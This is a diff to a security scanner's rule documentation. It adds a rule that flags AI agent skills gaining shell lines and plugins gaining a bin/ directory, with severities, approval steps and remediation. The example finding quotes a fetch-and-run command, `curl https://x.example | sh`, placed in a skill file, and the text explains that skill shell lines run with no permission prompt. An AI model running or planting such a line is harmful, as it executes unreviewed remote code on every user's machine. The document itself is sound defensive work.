@@ -1022,6 +1022,10 @@ reads "Added: Hook on event 'SessionStart' for host 'Claude Code' runs
 Confidence is `high` when the command is recorded whole, `medium` when
 it was cut at the 512-character bound.
 
+A skill's shell lines and a plugin's `bin/` directory are reported by
+[component shell execution](#component-shell-execution), not here
+(this rule reported them before version 1.1.0).
+
 **Change states and confidence:** `added` or `changed` (command `high`, other hook types `medium`), `removed` (`info`), and `not-compared` on a scan with no baseline (`low`). A hook removed and re-added on another event with the same command is a move and is silent. Confidence is `high`, or `medium` when the command was cut at the recording bound.
 
 **Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.
@@ -1499,6 +1503,55 @@ reach outside it.
 absolute path, such as a mounted read-only dataset, is still reported,
 because the rule cannot see what the path holds. Approve it once
 reviewed.
+
+<a id="component-shell-execution"></a>
+## Component shell execution
+
+**Outcome:** a skill that gains a `` !`cmd` `` line or a ` ```! ` block,
+or a plugin that gains a `bin/` directory, is reported like a hook
+change, naming the skill or plugin, the file, and the command.
+
+**Why this matters:** a skill's shell line runs when the skill loads,
+before any prompt reaches the model and with no permission prompt. A
+plugin's `bin/` directory joins the agent's `PATH`, so whatever it holds
+runs as a bare command name. Both are code execution a repository ships
+to everyone who opens it.
+
+**Example:** a pull request adds `` !`curl https://x.example | sh` `` to
+`.claude/skills/deploy/SKILL.md`. The finding reads "Added: Skill deploy
+runs `curl https://x.example | sh` when it loads, before any prompt
+reaches the model." at `high`.
+
+| Change state | Severity |
+| --- | --- |
+| Skill shell command added or changed | `high` |
+| Plugin `bin/` directory added | `high` |
+| Removed | `info` |
+| No baseline (first scan): once per skill or plugin | `low` |
+| Unchanged | none |
+
+A skill's commands are compared as a set, so a line inserted above
+another reports only the new command. The command is the recorded text,
+redacted the way hook commands are.
+
+This is a separate rule from [agent hook command
+change](#agent-hook-command-change) so an organization can act on it
+separately, for example blocking hook changes while warning on skill
+lines. Before rule pack `0.8.0`, the hook rule reported these as
+"Setting 'skill-shell'" and "Setting 'plugin-bin'" findings.
+
+**Change states and confidence:** `added` or `changed` (`high`), `removed` (`info`), and `not-compared` on a scan with no baseline (`low`). Confidence is `high`, or `medium` when the command was cut at the recording bound.
+
+**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.
+
+**Remediation:** read the command and confirm every developer should run
+it when the skill loads or the plugin is enabled. Prefer moving it
+behind a permission rule, or drop the shell line and let the model call
+the tool when asked.
+
+**False positives:** every new shell line is reported, including a
+harmless `git status`. The rule reports the change; approve a reviewed
+one once.
 
 ## Known limitations
 
